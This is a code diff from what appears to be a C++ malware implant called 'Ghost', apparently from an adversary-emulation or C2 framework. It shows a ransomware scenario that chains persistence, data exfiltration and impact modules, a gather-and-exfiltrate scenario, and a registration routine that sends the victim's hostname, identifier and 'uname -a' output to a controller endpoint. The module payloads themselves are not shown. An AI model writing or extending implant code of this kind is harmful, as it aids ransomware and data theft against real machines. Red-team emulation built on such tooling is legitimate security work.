@@ -51,7 +51,6 @@ Ghost::Ghost() {
 }
 
 #ifdef SCENARIO_MODE
-// TODO: instead of this make a map of scenarios (like with modules) and just scenario->run() or smth like that
 void Ghost::runScenario(ScenarioType type) {
     LOG_INFO("[SCENARIO MODE] Initializing...")
 
@@ -60,7 +59,7 @@ void Ghost::runScenario(ScenarioType type) {
         case ScenarioType::RANSOMWARE:
             LOG_INFO("[SCENARIO] Executing ransomware")
 
-            modules["PERSIST"]->execute();  // TODO: make this more granular with specific method instead of the orchestrating module
+            modules["PERSIST"]->execute();
             modules["EXFIL"]->execute();
             modules["IMPACT"]->execute();
             // TODO: leave a ransom note
@@ -73,10 +72,7 @@ void Ghost::runScenario(ScenarioType type) {
 
             modules["GATHER"]->execute();
             modules["EXFIL"]->execute();
-            // modules["PERSIST"]->execute();
 
-            // run has persistence for now
-            // TODO: adjust that
             this->run();
             break;
         #endif
@@ -153,13 +149,18 @@ void Ghost::runScenario(ScenarioType type) {
 bool Ghost::reg() {
     LOG_INFO("Trying to register GHOST [{}]", this->uuid)
 
-    // TODO: check here if gathering module is present. if yes, gather the sysinfo (if present) and send in payload
     json payload = {
         {"id", this->uuid},
         {"hostname", this->hostname},
         {"os", "linux"},
         {"arch", "x86"}
     };
+
+    #ifdef FEATURE_GATHERING
+        #ifdef METHOD_SYSINFO
+        payload["sysinfo"] = SystemUtils::ExecuteCommand("uname -a");
+        #endif
+    #endif
 
     while (true) {
         std::string response = Comms::SendPost("/api/v1/ghost/register", payload.dump());
